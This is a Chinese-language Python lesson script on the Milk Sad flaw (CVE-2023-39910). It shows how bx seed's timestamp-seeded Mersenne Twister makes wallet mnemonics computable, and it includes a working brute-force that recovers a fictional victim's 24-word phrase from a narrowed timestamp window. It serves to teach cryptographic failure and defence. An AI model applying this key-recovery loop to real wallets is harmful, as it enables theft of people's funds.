#!/usr/bin/env python3
"""
第 2 课 · 强随机数没有「第一个钱包」，弱随机数有，而且能被念出来。

    python3 milk_sad.py          # 跑完整课
    python3 milk_sad.py --attack # 只跑爆破那一段
"""
import os
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "common"))
from lesson import banner, section, fmt_dt, vs_universe, rate_table  # noqa: E402
from mt19937 import MT19937, first_bytes_high8                  # noqa: E402
from bip39 import entropy_to_mnemonic                           # noqa: E402

MILK_SAD = ("milk sad wage cup reward umbrella raven visa give list decorate bulb "
            "gold raise twenty fly manual stand float super gentle climb fold park")


def bx_seed(unix_time_seconds: int, nbytes: int = 32) -> bytes:
    """
    `bx seed` 做的事，一行一行写出来就这么多：

        std::mt19937 engine(seed);                 // 种子 = 32 位时间戳
        uniform_int_distribution<uint8_t> dist;    // 每次取一个字节
        for (b : out) b = dist(engine);            // 填满熵缓冲区

    libstdc++ 给小区间取的是输出的**高位**，所以每个 32 位输出只用掉最高那个字节。
    浪费 24 位 —— 但这不影响搜索空间：**空间大小由种子决定，不由每次取多少位决定。**
    """
    return MT19937(unix_time_seconds).bytes_high8(nbytes)


def main():
    banner(2, "bx seed / Milk Sad（CVE-2023-39910）",
           "强随机数没有「第一个钱包」。弱随机数有，而且那个钱包能被念出来。",
           "Milk Sad 研究更新 #1–#22，milksad.info；CVE-2023-39910。潜伏 6 年 4 个月。")

    section("1 · 系统时间 = 0 的时候，bx seed 永远生成这一串")
    ent = bx_seed(0)
    got = entropy_to_mnemonic(ent)
    print(f"  熵（32 字节）: {ent.hex()}")
    print(f"\n  {got}\n")
    print(f"  和 Milk Sad 公开的那一串逐字一致: {got == MILK_SAD}")
    print("\n  ↑ 这个项目的名字就是从这里来的。整课最该记住的一句在这里：")
    print("    **能给「第一个」起名字，就已经是证明了。**")
    print("    一个真正 2^256 大的空间里没有「第一个」—— 问「第一个是哪个」这句话本身没有意义。")

    section("2 · 对照：强随机数的「第一个钱包」是什么")
    for i in range(3):
        print(f"  os.urandom 第 {i + 1} 次: {entropy_to_mnemonic(os.urandom(32)).split()[0:4]}")
    print("\n  再跑一次，还是三个新的。**没有「第一个」，因为没有「第 0 个种子」。**")
    print("  这就是弱和强的全部区别 —— 不在词的样子上，在「有没有一个能被念出来的起点」上。")

    section("3 · 整个 2^32 空间长什么样：头 10 个种子")
    print(f"  {'种子':>12}  头三个词")
    for s in range(10):
        print(f"  {s:>12}  {' '.join(entropy_to_mnemonic(bx_seed(s)).split()[:3])}")
    print("\n  种子是时间戳，所以真实用户落在一段很窄的区间里 —— 不是 2^32，是「他装软件那几个月」。")

    section("4 · 爆破：真的把那把钥匙算出来")
    # 固定的 demo 时间戳，纯虚构，用来演示。2021-06-01 12:00:00 UTC
    victim_t = 1622548800
    victim_ent = bx_seed(victim_t)
    victim_mn = entropy_to_mnemonic(victim_ent)
    print("  demo 受害者（虚构）：他在某个时刻用 bx seed 生成了 24 个词。")
    print(f"  头四个词: {' '.join(victim_mn.split()[:4])} ...")
    print("""
  攻击者手里有两样东西：
    1. 源码 —— 知道种子就是 32 位 Unix 时间戳（公开的，CVE 都写了）
    2. 链上数据 —— **这个钱包的第一笔交易**，给出了创建时间的上界

  第 2 条是真实攻击者确实会做的缩减，而且它很便宜：
  钱包不可能在收到第一笔钱之后才被创建。假设第一笔交易出现在创建后的一天内，
  2^32 就塌成 86,400 个候选 —— 一台笔记本的量级。""")

    first_tx = victim_t + 9 * 3600         # 假设第一笔交易在创建 9 小时后
    window = range(first_tx - 86400, first_tx + 1)
    print(f"\n  扫描区间: [{window.start}, {window.stop}) 共 {len(window):,} 个候选")
    prefix = victim_ent[:4]                # 先比 4 个字节，命中了再做 BIP39
    t0 = time.perf_counter()
    found, tried = None, 0
    for s_ in window:
        tried += 1
        if first_bytes_high8(s_, 4) == prefix:
            if entropy_to_mnemonic(first_bytes_high8(s_, 32)) == victim_mn:
                found = s_
                break
    dt = time.perf_counter() - t0
    per_sec = tried / dt
    print(f"\n  ✅ 找到了：种子 = {found}"
          f"（= {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime(found))}）")
    print(f"     {tried:,} 次尝试，{dt:.1f} 秒，{per_sec:,.0f} 候选/秒（纯 Python，单核）")
    print(f"\n     {entropy_to_mnemonic(bx_seed(found))}")
    print(f"\n  这就是「钥匙可被计算」这句话的字面意思。没有碰设备，没有碰网络，")
    print("  没有一次失败的尝试留下痕迹。受害者那一侧什么都没有发生。")

    section("5 · 成本：把这个速率外推出去")
    rate_table(per_sec, [
        ("2^22（Coldcard Mk3）", 2 ** 22),
        ("2^32（bx / Trust Wallet 扩展）", 2 ** 32),
        ("2^39（Ill Bloom，128 位）", 2 ** 39),
        ("2^52（Coldcard Mk4 建模切片）", 2 ** 52),
    ])
    print(f"\n  而本该有的那个空间，2^128：")
    print(f"    本机        {vs_universe(2 ** 128 / per_sec)}")
    print(f"    单张 4090   {vs_universe(2 ** 128 / 1_500_000)}")
    print("\n  2^32 和 2^128 之间不是「更难一点」，是「47 分钟」和「宇宙年龄的 10^14 倍」。")
    print("  **这 96 位，是「在操作系统随机数接口外面包一层」这一个动作的全部代价。**")

    section("6 · 一个容易踩的坑：Python 的 random.seed 不是 C++ 的 mt19937")
    import random
    random.seed(0)
    print(f"  random.seed(0)   头 3 个输出: {[random.getrandbits(32) for _ in range(3)]}")
    m = MT19937(0)
    print(f"  std::mt19937(0)  头 3 个输出: {[m.genrand_uint32() for _ in range(3)]}")
    print("  Python 走 init_by_array，C++ 走 init_genrand。**同一个算法，不同的播种，不同的流。**")
    print("  复现别人的 bug 时这是最常见的失败原因 —— 所以本课程自己实现 MT19937，不 import。")

    section("7 · 这一课的那个受害者")
    print("""  Milk Sad 的受害者画像是整个案例库里最该让人警醒的一个：

    air-gap、BIP39 24 个词、同时导入 Ledger 和 Trezor 两台硬件钱包。
    看着比 99% 的人专业。他们只错了一件事：

        **两台设备，一个熵源。**

  这是多签唯一的硬理由 —— 不是「一台坏了还有别的」，
  是「三把钥匙在三家厂商的设备上各自生成，才能挺过其中一家把随机数写错了」。""")


if __name__ == "__main__":
    if "--attack" in sys.argv:
        victim_t = 1622548800
        victim = entropy_to_mnemonic(bx_seed(victim_t))
        print(f"目标: {' '.join(victim.split()[:4])} ...")
        t0 = time.perf_counter()
        for s in range(1609459200, 1640995200):
            if entropy_to_mnemonic(bx_seed(s)) == victim:
                print(f"种子 {s}，用了 {time.perf_counter() - t0:.1f} 秒")
                break
    else:
        main()
